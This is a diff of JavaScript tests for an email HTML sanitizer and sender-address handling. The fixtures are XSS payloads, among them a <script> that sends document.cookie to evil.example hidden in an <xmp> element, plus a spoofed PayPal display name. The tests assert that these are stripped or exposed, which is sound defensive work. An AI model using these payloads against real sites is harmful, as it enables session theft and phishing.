@@ -115,6 +115,37 @@ test('the sanitizer fixtures (7.5)', async () => {
   assert.equal(await s('<img src="cid:a@b">', { cid: { 'a@b': 'data:image/png;base64,AAAA' }, dropDataImages: true }), '');
   assert.equal(await s('<math><mi>x</mi></math><object data="x"></object><embed src="y"><portal src="z"></portal>t'), 't');
   assert.equal(await s('<p onmouseover="x" style="color:red">t</p>'), '<p>t</p>');
+  // Raw-text elements: their content is text to the tokenizer, so unwrapping them would copy it out as live markup.
+  assert.equal(await s('<xmp><script>alert(1)</script></xmp>ok'), 'ok');
+  assert.equal(await s('<noembed><img src=x onerror=alert(1)></noembed>ok'), 'ok');
+  assert.equal(await s('<noframes><script>alert(1)</script></noframes>ok'), 'ok');
+  assert.equal(await s('<p>a</p><plaintext><script>alert(1)</script><a href="javascript:x">x</a>'), '<p>a</p>');
+  for (const name of ['script', 'style', 'xmp', 'iframe', 'noembed', 'noframes', 'noscript', 'title', 'textarea', 'XMP', 'NoEmbed']) {
+    const out = await s(`<${name}><script>alert(1)</script><img src=x onerror=alert(2)></${name}>ok`);
+    // For <script> itself the content ends at the first </script>: the <img> after it is markup (and removed), and the
+    // outer </script> is a stray end tag, which opens nothing.
+    assert.equal(out.replace('</script>', ''), 'ok', `${name}: ${out}`);
+  }
+  assert.doesNotMatch(await s('<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>z'), /<img|onerror=alert\(1\)>/);
+  assert.match(await s('<p>x<image src="https://i.example/a.png" onerror="alert(1)">y</p>'), /^<p>xy(<\/p>)?$/, '<image> is unwrapped, never kept');
+  assert.equal(await s('<listing><b>l</b></listing>'), '<b>l</b>');
+});
+
+test('a newsletter whose HTML hides markup in <xmp>, and an HTML attachment: no script reaches the Reader', async () => {
+  const body = '<p>Weekly</p><xmp><script>fetch("https://evil.example/"+document.cookie)</script></xmp><p>' + 'Long enough body. '.repeat(30) + '</p>';
+  const attachment = '<html><head><meta charset="windows-1252"><script>alert(1)</script></head><body><h1>Caf\u00e9</h1><a href="javascript:alert(2)">x</a><img src=x onerror=alert(3)></body></html>';
+  const [page, file] = await items(mime({
+    subject: 'Weekly', html: body,
+    attachments: [{ type: 'text/html', name: 'report.html', data: Buffer.from(attachment, 'latin1') }],
+  }));
+  assert.equal(page.kind, 'page');
+  assert.match(page.text, /<p>Weekly<\/p>/);
+  assert.doesNotMatch(page.text, /<script|evil\.example/i);
+  assert.equal(file.kind, 'file');
+  assert.equal(file.mime, 'text/html');
+  assert.match(file.text, /^<!doctype html><html><head><meta charset="utf-8"><title>report<\/title>/);
+  assert.match(file.text, /<h1>Café<\/h1>/, 'decoded with the charset its <meta> declares, written as UTF-8');
+  assert.doesNotMatch(file.text, /<script|javascript:|onerror|<img/i);
 });
 
 test('email() stores, the Cron parses one message per run, the item reaches the outbox and the raw mail is deleted', async () => {
@@ -204,4 +235,23 @@ test('without DAYLIGHT_EMAIL_DOMAIN: needs-domain, 409 NOT_CONFIGURED and every 
     const res = await no.email(mime({ subject: 'x', text: 'x' }), { to: 'daylight-x@mail.test' });
     assert.equal(res.rejectReason, 'This address is not set up.');
   } finally { await no.close(); }
+});
+
+test('an encoded-word display name can’t stand in for the sender: block list, caps, "Recent mail" and the item use the real address', async () => {
+  const e = await setup();
+  try {
+    assert.equal((await e.api('POST', '/v1/email/block', { json: { pattern: '@evil.example' } })).status, 201);
+    const from = '=?utf-8?q?PayPal_<service@paypal.com>?= <spam@evil.example>';
+    await e.email(mime({ headers: [CF_AUTH('pass')], from, subject: 'Your account', text: 'x' }), { from: 'spam@evil.example' });
+    const [row] = await e.rows("SELECT from_addr, from_domain, from_name, state, reason FROM mail WHERE subject = 'Your account'");
+    assert.deepEqual(row, { from_addr: 'spam@evil.example', from_domain: 'evil.example', from_name: 'PayPal', state: 'dropped', reason: 'blocked' });
+    const quoted = '"service@paypal.com" <other@evil2.example>';
+    await e.email(mime({ headers: [CF_AUTH('pass')], from: quoted, subject: 'Quoted', text: 'x' }), { from: 'other@evil2.example' });
+    const recent = (await e.api('GET', '/v1/email/recent')).json.find((m) => m.subject === 'Quoted');
+    assert.equal(recent.from, 'other@evil2.example', 'a name that looks like an address is not shown');
+    const r = await e.dispatch(`${SERVER}/__test/email-items`, { method: 'POST', body: mime({ from, subject: 'Item', text: 'A newsletter body long enough. '.repeat(20) }) });
+    const [page] = await r.json();
+    assert.equal(page.from, 'Email · PayPal');
+    assert.doesNotMatch(page.text, /paypal\.com/);
+  } finally { await e.close(); }
 });
